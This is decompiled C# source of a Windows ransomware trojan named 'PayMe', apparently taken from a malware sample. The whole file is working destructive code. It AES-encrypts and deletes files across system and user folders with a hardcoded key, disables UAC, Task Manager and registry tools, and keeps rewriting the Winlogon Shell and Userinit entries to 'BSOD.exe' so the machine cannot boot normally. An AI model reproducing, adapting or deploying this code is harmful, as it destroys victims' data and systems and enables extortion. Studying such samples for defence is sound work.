// Decompiled with JetBrains decompiler
// Type: PayMe.Encryption
// Assembly: PayMe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 298F59B2-D782-4C3E-9335-E4B1935CDF6B
// Assembly location: C:\Users\Administrateur\Downloads\UDS-Trojan.MSIL.DiskWriter.gen-4410111ba794c46861f4fbfce06d6c8a790582d0fdd7fbe070f30b0cee93e2a6.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace PayMe
{
  internal class Encryption
  {
    public class Encryp_main
    {
      public static void Main()
      {
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.High;
        if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\decrypted"))
          File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\decrypted");
        Encryption.Encryp_main encrypMain = new Encryption.Encryp_main();
        try
        {
          foreach (string file in Directory.GetFiles("C:\\"))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles("C:\\Program Files"))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles("C:\\Program Files (x86)"))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles("C:\\Users"))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles("C:\\Windows"))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles("C:\\Windows\\System32"))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Personal)))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
          {
            try
            {
              encrypMain.EncryptFile(file, file + ".CRYPT");
              File.Delete(file);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          string[] strArray = new string[26]
          {
            "A:\\",
            "B:\\",
            "D:\\",
            "E:\\",
            "F:\\",
            "G:\\",
            "H:\\",
            "CH:\\",
            "I:\\",
            "J:\\",
            "K:\\",
            "L:\\",
            "M:\\",
            "N:\\",
            "O:\\",
            "P:\\",
            "Q:\\",
            "R:\\",
            "S:\\",
            "T:\\",
            "U:\\",
            "V:\\",
            "W:\\",
            "X:\\",
            "Y:\\",
            "Z:\\"
          };
          foreach (string str in strArray)
          {
            try
            {
              encrypMain.EncryptFile(str, str + ".CRYPT");
              File.Delete(str);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("FilterAdministratorToken", (object) 1, RegistryValueKind.DWord);
        Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("EnableLUA", (object) 0, RegistryValueKind.DWord);
        Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) 1, RegistryValueKind.DWord);
        Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableRegistryTools", (object) 1, RegistryValueKind.DWord);
        new Thread(new ThreadStart(encrypMain.looper)).Start();
        int num = (int) new Form1().ShowDialog();
      }

      public void looper()
      {
        while (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\decrypted"))
        {
          Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("FilterAdministratorToken", (object) 1, RegistryValueKind.DWord);
          Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("EnableLUA", (object) 0, RegistryValueKind.DWord);
          Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) 1, RegistryValueKind.DWord);
          Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableRegistryTools", (object) 1, RegistryValueKind.DWord);
          Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", (object) "BSOD.exe", RegistryValueKind.String);
          Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Userinit", (object) "C:\\Windows\\BSOD.exe", RegistryValueKind.String);
          Thread.Sleep(500);
        }
      }

      public static void Extract(
        string nameSpace,
        string outDirectory,
        string internalFilePath,
        string resourceName)
      {
        using (Stream manifestResourceStream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
        {
          using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
          {
            using (FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            {
              using (BinaryWriter binaryWriter = new BinaryWriter((Stream) output))
                binaryWriter.Write(binaryReader.ReadBytes((int) manifestResourceStream.Length));
            }
          }
        }
      }

      private void EncryptFile(string inputFile, string outputFile)
      {
        try
        {
          byte[] bytes = new UnicodeEncoding().GetBytes("d7a01s9u");
          FileStream fileStream1 = new FileStream(outputFile, FileMode.Create);
          RijndaelManaged rijndaelManaged = new RijndaelManaged();
          CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
          FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
          int num;
          while ((num = fileStream2.ReadByte()) != -1)
            cryptoStream.WriteByte((byte) num);
          fileStream2.Close();
          cryptoStream.Close();
          fileStream1.Close();
        }
        catch
        {
        }
      }
    }
  }
}
